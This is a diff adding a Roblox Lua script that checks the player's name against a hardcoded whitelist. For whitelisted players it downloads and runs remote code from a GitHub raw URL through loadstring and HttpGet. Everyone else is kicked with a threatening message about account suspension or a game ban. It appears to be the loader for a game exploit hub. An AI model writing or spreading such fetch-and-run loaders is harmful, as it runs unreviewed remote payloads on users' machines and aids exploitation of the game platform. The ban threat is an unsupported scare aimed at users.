@@ -1,0 +1,10 @@
+local weinzwhitelisted = { "32Zaak", "Player2" }
+
+function isWeinzwhitelisted(player) for _, name in ipairs(weinzwhitelisted) do if name == player.Name then return true end end return false end
+
+local player = game.Players.LocalPlayer
+if isWeinzwhitelisted(player) then 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/serpo222/ASXGRAMHUBX/main/ASX", true))()
+else
+game.Players.LocalPlayer:Kick("Attempting to bypass the script may result in account suspension or Game Ban")
+end
